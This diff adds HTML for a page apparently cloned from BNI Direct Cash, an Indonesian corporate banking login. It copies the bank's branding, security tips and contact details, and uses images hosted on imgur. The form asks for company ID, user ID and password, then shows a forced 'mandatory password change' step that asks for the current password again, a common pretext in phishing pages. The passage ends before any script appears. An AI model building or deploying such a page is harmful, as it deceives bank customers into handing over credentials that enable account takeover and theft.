@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1200">
+    <title>BNI Direct Cash - Perbankan Digital untuk Bisnis</title>
+    
+    <meta name="description" content="BNI Direct Cash - Solusi perbankan digital terbaik untuk bisnis Anda.">
+    <meta name="keywords" content="BNI Direct Cash, BNI Business Banking, BNI Corporate Banking, BNI Internet Banking, BNI Online Banking, Login BNI, Perbankan Bisnis BNI">
+    <meta name="author" content="PT Bank Negara Indonesia (Persero) Tbk">
+    <meta name="robots" content="index, follow">
+    
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="BNI Direct Cash - Perbankan Digital untuk Bisnis">
+    <meta property="og:description" content="Solusi perbankan digital terbaik untuk bisnis Anda.">
+    <meta property="og:locale" content="id_ID">
+    
+    <link rel="canonical" href="https://bnidirect.bni.co.id">
+    <meta name="theme-color" content="#1a7a7a">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            color: #333;
+            min-height: 100vh;
+        }
+
+        .page { display: none; }
+        .page.active { display: block; }
+
+        /* ============ HEADER ============ */
+        .header {
+            background: #fff;
+            padding: 12px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .logo img { height: 32px; width: auto; display: block; }
+        .lang-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 14px;
+            border: 1px solid #ddd;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 13px;
+            color: #333;
+            background: #fff;
+        }
+        .lang-flag {
+            width: 22px;
+            height: 14px;
+            background: linear-gradient(to bottom, #ff0000 50%, #ffffff 50%);
+            border-radius: 2px;
+            border: 1px solid #ccc;
+        }
+
+        /* ============ MAIN CONTENT ============ */
+        .main-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 40px;
+        }
+        /* DIPERKECIL: dari 560px menjadi 440px */
+        .form-wrapper { max-width: 440px; }
+
+        /* ============ SECURITY GUIDE ============ */
+        .security-guide {
+            background: #1a7a7a;
+            color: #fff;
+            border-radius: 8px;
+            padding: 16px 20px;
+        }
+        .security-guide h2 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .security-guide ul {
+            list-style: disc;
+            padding-left: 20px;
+            margin-bottom: 14px;
+        }
+        .security-guide ul li {
+            margin-bottom: 6px;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        .security-guide ul li a {
+            color: #fff;
+            text-decoration: underline;
+        }
+        .security-guide ul li strong {
+            font-weight: 700;
+        }
+        .url-verify {
+            background: rgba(255,255,255,0.15);
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 6px;
+            padding: 10px 14px;
+            text-align: center;
+        }
+        .url-verify p {
+            font-size: 12px;
+            margin-bottom: 2px;
+            opacity: 0.9;
+        }
+        .url-verify .url {
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        /* ============ WARNING BOX ============ */
+        .change-password-warning {
+            background: #fff8e1;
+            border-left: 4px solid #e87722;
+            border-radius: 8px;
+            padding: 14px 18px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #333;
+        }
+        .change-password-warning .warn-icon {
+            color: #e87722;
+            font-size: 16px;
+            margin-right: 4px;
+        }
+        .change-password-warning strong {
+            color: #e87722;
+            font-weight: 700;
+        }
+
+        /* ============ INFO BOX ============ */
+        .token-info-box {
+            background: #e3f2fd;
+            border-left: 4px solid #1976d2;
+            border-radius: 8px;
+            padding: 14px 18px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #333;
+        }
+        .token-info-box .info-icon {
+            color: #1976d2;
+            font-size: 16px;
+            margin-right: 4px;
+        }
+        .token-info-box strong {
+            color: #1976d2;
+            font-weight: 700;
+        }
+
+        /* ============ FORM CONTAINER ============ */
+        .form-container {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-top: none;
+            border-radius: 0 0 8px 8px;
+            padding: 16px 20px;
+        }
+
+        .form-group { margin-bottom: 10px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.3s;
+            height: 40px;
+            background: #fafafa;
+        }
+        .form-group input:focus {
+            border-color: #1a7a7a;
+            background: #fff;
+        }
+        .form-group input::placeholder { color: #999; }
+
+        .password-wrapper { position: relative; }
+        .password-wrapper input { padding-right: 40px; }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0.5;
+        }
+        .toggle-password:hover { opacity: 1; }
+        .toggle-password svg { width: 18px; height: 18px; fill: #666; }
+
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 14px;
+            margin-bottom: 12px;
+        }
+        .btn-masuk, .btn-lanjutkan, .btn-verifikasi {
+            background: #e87722;
+            color: #fff;
+            border: none;
+            padding: 8px 28px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            height: 34px;
+        }
+        .btn-masuk:hover, .btn-lanjutkan.active:hover, .btn-verifikasi:hover { background: #d4691a; }
+        .btn-hapus {
+            background: #1a7a7a;
+            color: #fff;
+            border: none;
+            padding: 8px 28px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            height: 34px;
+        }
+        .btn-hapus:hover { background: #146565; }
+        .btn-lanjutkan {
+            background: #ccc;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        .btn-lanjutkan.active {
+            background: #e87722;
+            cursor: pointer;
+            opacity: 1;
+        }
+
+        .warning-box {
+            background: #f9f9f9;
+            border: 1px solid #e8e8e8;
+            border-radius: 5px;
+            padding: 8px 12px;
+            font-size: 12px;
+            color: #666;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .warning-box::before {
+            content: 'ⓘ';
+            font-size: 13px;
+            color: #999;
+        }
+
+        .form-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-top: 14px;
+            padding-top: 10px;
+        }
+        .lupa-password { font-size: 13px; }
+        .lupa-password a {
+            color: #e87722;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .lupa-password p {
+            font-size: 11px;
+            color: #888;
+            margin-top: 4px;
+            line-height: 1.4;
+        }
+        .lupa-password p a {
+            color: #1a7a7a;
+            text-decoration: underline;
+        }
+        .digi-cert { text-align: right; }
+        .digi-cert p {
+            font-size: 10px;
+            color: #888;
+            margin-bottom: 4px;
+        }
+        .digi-cert-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            border: 1px solid #ddd;
+            border-radius: 20px;
+            padding: 4px 12px;
+            font-size: 11px;
+            color: #1a7a7a;
+        }
+
+        /* ============ BANTUAN & DUKUNGAN ============ */
+        .bantuan-section {
+            margin-top: 16px;
+            max-width: 440px;
+        }
+        .bantuan-header {
+            background: #1a7a7a;
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 8px 8px 0 0;
+            font-size: 15px;
+            font-weight: 600;
+        }
+        .bantuan-links {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-top: none;
+            border-radius: 0 0 8px 8px;
+            overflow: hidden;
+        }
+        .bantuan-links a {
+            display: block;
+            padding: 14px 20px;
+            text-decoration: none;
+            color: #333;
+            font-size: 14px;
+            border-bottom: 1px solid #eee;
+            transition: background 0.2s;
+        }
+        .bantuan-links a:hover { background: #f5f5f5; }
+        .bantuan-links a:last-child { border-bottom: none; }
+
+        /* ============ SERVICE ACTION TEAM ============ */
+        .sat-section {
+            background: #e8ecef;
+            border-radius: 8px;
+            padding: 20px 24px;
+            margin-top: 16px;
+            max-width: 440px;
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+        .sat-title {
+            font-size: 12px;
+            font-weight: 700;
+            color: #333;
+            text-align: left;
+            line-height: 1.5;
+            min-width: 90px;
+            letter-spacing: 0.5px;
+        }
+        .sat-divider {
+            width: 1px;
+            height: 60px;
+            background: #ccc;
+            flex-shrink: 0;
+        }
+        .sat-contacts {
+            font-size: 13px;
+            color: #555;
+            line-height: 2;
+            flex: 1;
+        }
+        .sat-contacts div {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .sat-contacts div svg {
+            width: 16px;
+            height: 16px;
+            fill: #666;
+            flex-shrink: 0;
+        }
+        .sat-contacts a {
+            color: #1a7a7a;
+            text-decoration: none;
+        }
+        .sat-contacts a:hover { text-decoration: underline; }
+
+        /* ============ BANNER ============ */
+        .banner-section {
+            margin-top: 24px;
+            padding: 0 40px;
+        }
+        .banner-carousel-wrapper {
+            position: relative;
+            overflow: hidden;
+            border-radius: 10px;
+        }
+        .banner-carousel {
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+            scrollbar-width: none;
+            padding: 10px;
+        }
+        .banner-carousel::-webkit-scrollbar { display: none; }
+        .banner-card {
+            min-width: 340px;
+            height: 200px;
+            border-radius: 8px;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .banner-card img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .carousel-nav-btn {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #fff;
+            border: 2px solid #1a7a7a;
+            color: #1a7a7a;
+            font-size: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+        .carousel-nav-btn:hover { background: #1a7a7a; color: #fff; }
+        .carousel-nav-btn.prev { left: 10px; }
+        .carousel-nav-btn.next { right: 10px; }
+
+        /* ============ FOOTER ============ */
+        .footer {
+            background: #fff;
+            border-top: 1px solid #e0e0e0;
+            margin-top: 30px;
+            padding: 30px 40px 20px;
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 200px 1fr 1fr 1fr;
+            gap: 30px;
+            align-items: start;
+        }
+        .footer-logo img {
+            height: 40px;
+            width: auto;
+            display: block;
+        }
+        .footer-col h4 {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 12px;
+        }
+        .footer-col p, .footer-col a {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.8;
+            text-decoration: none;
+            display: block;
+        }
+        .footer-col a:hover {
+            color: #1a7a7a;
+            text-decoration: underline;
+        }
+        .footer-contact-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 8px;
+        }
+        .footer-contact-item svg {
+            width: 16px;
+            height: 16px;
+            fill: #1a7a7a;
+            flex-shrink: 0;
+        }
+
+        .footer-legal {
+            max-width: 1200px;
+            margin: 20px auto 0;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+            font-size: 12px;
+            color: #888;
+            line-height: 1.7;
+        }
+        .footer-legal p { margin-bottom: 8px; }
+        .footer-legal strong { color: #555; }
+
+        .footer-bottom {
+            background: #1a7a7a;
+            color: #fff;
+            overflow: hidden;
+            white-space: nowrap;
+            padding: 10px 0;
+            font-size: 12px;
+        }
+        .footer-bottom .marquee-content {
+            display: inline-block;
+            animation: marquee 25s linear infinite;
+            padding-left: 100%;
+        }
+        .footer-bottom .marquee-content:hover {
+            animation-play-state: paused;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+
+        /* ============ ERROR BOX ============ */
+        .error-message-box {
+            margin-top: 12px;
+            padding: 12px 14px;
+            background: #ffebee;
+            border-left: 4px solid #e53935;
+            border-radius: 6px;
+            display: none;
+            animation: errorSlideIn 0.3s ease-out;
+        }
+        .error-message-box.show { display: block; }
+        @keyframes errorSlideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .error-message-text {
+            font-size: 13px;
+            color: #c62828;
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .error-timer-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #555;
+        }
+        .error-timer-value {
+            font-family: 'Courier New', monospace;
+            font-size: 15px;
+            font-weight: 700;
+            color: #e53935;
+            background: #fff;
+            padding: 3px 10px;
+            border-radius: 4px;
+            border: 1px solid #ffcdd2;
+            min-width: 60px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============ HALAMAN 1: LOGIN ============ -->
+    <div id="page1" class="page active">
+        <header class="header">
+            <div class="logo">
+                <img src="https://i.imgur.com/WzZsBVh.jpeg" alt="BNI Direct Cash Logo">
+            </div>
+            <div class="lang-selector">
+                <div class="lang-flag"></div>
+                <span>Bahasa Indonesia</span>
+            </div>
+        </header>
+
+        <div class="main-content">
+            <div class="form-wrapper">
+                <div class="security-guide">
+                    <h2> Panduan Keamanan</h2>
+                    <ul>
+                        <li>Jangan bagikan User ID, kata sandi, dan OTP Anda ke siapapun, termasuk pihak BNI.</li>
+                        <li>BNI tidak pernah meminta data rahasia Anda melalui media apapun. Abaikan atau laporkan ketika terjadi.</li>
+                        <li>Hindari pemakaian komputer atau Wi-Fi publik, dan log out setelah selesai.</li>
+                        <li>Ada aktivitas tidak wajar atau butuh bantuan? Hubungi <strong>(021) 29946046</strong> atau <a href="mailto:tbs_sat@bni.co.id">tbs_sat@bni.co.id</a></li>
+                    </ul>
+                    <div class="url-verify">
+                        <p>Pastikan URL Anda</p>
+                        <p class="url">https://bnidirect.bni.co.id</p>
+                    </div>
+                </div>
+
+                <div class="form-container">
+                    <form id="loginForm" onsubmit="return handleLogin(event)">
+                        <div class="form-group">
+                            <input type="text" id="companyId" placeholder="Masukkan ID Perusahaan Anda" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="userId" placeholder="Masukkan ID Pengguna Anda" required>
+                        </div>
+                        <div class="form-group password-wrapper">
+                            <input type="password" id="password" placeholder="Masukkan Kata Sandi Anda" required>
+                            <button type="button" class="toggle-password" onclick="togglePassword('password', 'eyeIcon1', 'eyeOffIcon1')">
+                                <svg id="eyeIcon1" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                                <svg id="eyeOffIcon1" viewBox="0 0 24 24" style="display: none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16c.57-.23 1.18-.36 1.83-.36zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                            </button>
+                        </div>
+
+                        <div class="btn-row">
+                            <button type="submit" class="btn-masuk" id="btnMasuk">Masuk</button>
+                            <button type="button" class="btn-hapus" onclick="clearForm()">Hapus</button>
+                        </div>
+
+                        <div class="warning-box">
+                            Disarankan untuk tidak menyimpan Kata Sandi anda
+                        </div>
+                    </form>
+
+                    <div class="form-footer">
+                        <div class="lupa-password">
+                            <a href="#">Lupa Kata Sandi?</a>
+                            <p>Dengan klik tombol Masuk,<br>Anda setuju dengan <a href="#">Syarat & Ketentuan</a></p>
+                        </div>
+                        <div class="digi-cert">
+                            <p>Security Certified by</p>
+                            <div class="digi-cert-badge">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="#1a7a7a"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                                <span><strong>digi</strong>cert</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bantuan-section">
+                    <div class="bantuan-header">Bantuan & Dukungan</div>
+                    <div class="bantuan-links">
+                        <a href="#"> Panduan Singkat</a>
+                        <a href="#">📝 Formulir BNIdirect</a>
+                    </div>
+                </div>
+
+                <div class="sat-section">
+                    <div class="sat-title">SERVICE<br>ACTION<br>TEAM</div>
+                    <div class="sat-divider"></div>
+                    <div class="sat-contacts">
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                            <span>(021) 29946046</span>
+                        </div>
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                            <a href="mailto:tbs_sat@bni.co.id">tbs_sat@bni.co.id</a>
+                        </div>
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.625.846 5.059 2.284 7.034L.789 23.492a.5.5 0 00.612.638l4.733-1.238A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-2.24 0-4.326-.726-6.015-1.96l-.42-.315-3.3.862.882-3.217-.346-.453A9.96 9.96 0 012 12C2 6.486 6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"/></svg>
+                            <span>0858 5000 1946</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="banner-section">
+            <div class="banner-carousel-wrapper" id="bannerWrapper">
+                <button class="carousel-nav-btn prev" onclick="scrollBannerManual(-1)">‹</button>
+                <div class="banner-carousel" id="bannerCarousel">
+                    <div class="banner-card"><img src="https://i.imgur.com/g8IogtJ.jpeg" alt="Banner 1"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/9PAbnSF.jpeg" alt="Banner 2"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/ybmb003.jpeg" alt="Banner 3"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/g8IogtJ.jpeg" alt="Banner 1"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/9PAbnSF.jpeg" alt="Banner 2"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/ybmb003.jpeg" alt="Banner 3"></div>
+                </div>
+                <button class="carousel-nav-btn next" onclick="scrollBannerManual(1)">›</button>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <img src="https://i.imgur.com/WzZsBVh.jpeg" alt="BNI Logo">
+                </div>
+                <div class="footer-col">
+                    <h4>Kantor BNI</h4>
+                    <p>Gedung Graha BNI</p>
+                    <p>Jl. Jenderal Sudirman Kav. 1</p>
+                    <p>Jakarta Pusat 10220</p>
+                    <p>Indonesia</p>
+                </div>
+                <div class="footer-col">
+                    <h4>Hubungi Service Action Team</h4>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                        <span>(021) 29946046</span>
+                    </div>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                        <span>tbs_sat@bni.co.id</span>
+                    </div>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.625.846 5.059 2.284 7.034L.789 23.492a.5.5 0 00.612.638l4.733-1.238A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-2.24 0-4.326-.726-6.015-1.96l-.42-.315-3.3.862.882-3.217-.346-.453A9.96 9.96 0 012 12C2 6.486 6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"/></svg>
+                        <span>0858 5000 1946</span>
+                    </div>
+                </div>
+                <div class="footer-col">
+                    <h4>Bantuan & Dukungan</h4>
+                    <a href="#">Syarat dan Ketentuan</a>
+                </div>
+            </div>
+            <div class="footer-legal">
+                <p><strong>PT Bank Negara Indonesia (Persero) Tbk</strong> berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) & Bank Indonesia (BI) serta merupakan peserta penjamin Lembaga Penjamin Simpanan (LPS). Maksimum nilai simpanan yang dijamin LPS per nasabah Rp. 2 Milyar. Info lebih lanjut pada https://apps.lps.go.id/BankPesertaLPSRate</p>
+                <p>© Hak Cipta 2023 PT. Bank Negara Indonesia (Persero), Tbk</p>
+            </div>
+        </footer>
+
+        <div class="footer-bottom">
+            <div class="marquee-content">
+                Nasabah BNI yang kami hormati. Dengan ini diinformasikan bahwa layanan SAT (Service Action Team) sebagai berikut, contact email : tbs_sat@bni.co.id • Hubungi kami di (021) 29946046 atau WhatsApp 0858 5000 1946 • Terima kasih
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ HALAMAN 2: PERUBAHAN KATA SANDI ============ -->
+    <div id="page2" class="page">
+        <header class="header">
+            <div class="logo">
+                <img src="https://i.imgur.com/WzZsBVh.jpeg" alt="BNI Direct Cash Logo">
+            </div>
+            <div class="lang-selector">
+                <div class="lang-flag"></div>
+                <span>Bahasa Indonesia</span>
+            </div>
+        </header>
+
+        <div class="main-content">
+            <div class="form-wrapper">
+                <div class="change-password-warning">
+                    <span class="warn-icon"></span> Demi meningkatkan Keamanan dan Kenyamanan Pengguna untuk bertransaksi BNI Direct Cash <strong>(WAJIB) PERUBAHAN Kata Sandi.</strong>
+                </div>
+
+                <div class="form-container">
+                    <form id="changePasswordForm" onsubmit="return handleChangePassword(event)">
+                        <div class="form-group">
+                            <label>Kata Sandi Saat Ini</label>
+                            <div class="password-wrapper">
+                                <input type="password" id="currentPassword" placeholder="Masukkan kata sandi saat ini" required oninput="checkFormValidity()">
+                                <button type="button" class="toggle-password" onclick="togglePassword('currentPassword', 'eyeCur', 'eyeCurOff')">
+                                    <svg id="eyeCur" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                                    <svg id="eyeCurOff" viewBox="0 0 24 24" style="display: none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16c.57-.23 1.18-.36 1.83-.36zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Kata Sandi Baru</label>
+                            <div class="password-wrapper">
+                                <input type="password" id="newPassword" placeholder="Masukkan kata sandi baru" required oninput="checkFormValidity()">
+                                <button type="button" class="toggle-password" onclick="togglePassword('newPassword', 'eyeNew', 'eyeNewOff')">
+                                    <svg id="eyeNew" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                                    <svg id="eyeNewOff" viewBox="0 0 24 24" style="display: none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16c.57-.23 1.18-.36 1.83-.36zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Konfirmasi Kata Sandi Baru</label>
+                            <div class="password-wrapper">
+                                <input type="password" id="confirmPassword" placeholder="Ulangi kata sandi baru" required oninput="checkFormValidity()">
+                                <button type="button" class="toggle-password" onclick="togglePassword('confirmPassword', 'eyeConf', 'eyeConfOff')">
+                                    <svg id="eyeConf" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
